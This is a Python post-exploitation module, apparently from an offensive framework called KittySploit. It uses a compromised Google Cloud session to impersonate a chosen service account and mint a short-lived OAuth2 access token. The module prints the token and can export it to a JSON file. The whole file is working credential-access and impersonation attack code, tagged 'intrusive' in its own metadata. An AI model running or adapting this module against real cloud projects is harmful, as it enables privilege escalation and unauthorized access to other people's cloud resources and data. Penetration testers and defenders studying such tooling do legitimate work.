#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Generate Access Token",
        "description": "Generate a short-lived OAuth2 access token for a target service account",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "iam", "credentials", "impersonation"],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_access", "api_request"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
        },
    }

    service_account_email = OptString("", "Target service account email", True)
    scopes = OptString(
        "https://www.googleapis.com/auth/cloud-platform",
        "Comma-separated OAuth scopes for the generated token",
        False,
    )
    lifetime = OptString("3600s", "Token lifetime (e.g. 3600s, max 3600s for user credentials)", False)
    mask_token = OptBool(True, "Mask access token in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            target = str(self.service_account_email or "").strip()
            if not target:
                print_error("service_account_email is required")
                return False

            scope_list = [item.strip() for item in str(self.scopes or "").split(",") if item.strip()]
            print_info(f"Generating access token for {target}...")
            result = self._gcp_generate_access_token(
                target,
                scopes=scope_list,
                lifetime=str(self.lifetime or "3600s"),
            )

            if not result.get("success"):
                print_error(f"Token generation failed: {result.get('error', '')}")
                return False

            token = str(result.get("accessToken") or "")
            expire_time = result.get("expireTime", "")
            print_success("Access token generated")
            print_info(f"Target: {target}")
            print_info(f"Expires: {expire_time or 'unknown'}")
            if token:
                displayed = self._gcp_mask_token(token) if self.mask_token else token
                print_info(f"Access token: {displayed}")

            output = {
                "project_id": project_id,
                "target": target,
                "accessToken": token,
                "expireTime": expire_time,
                "scopes": scope_list,
            }
            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Results exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"Access token generation failed: {exc}")
            return False
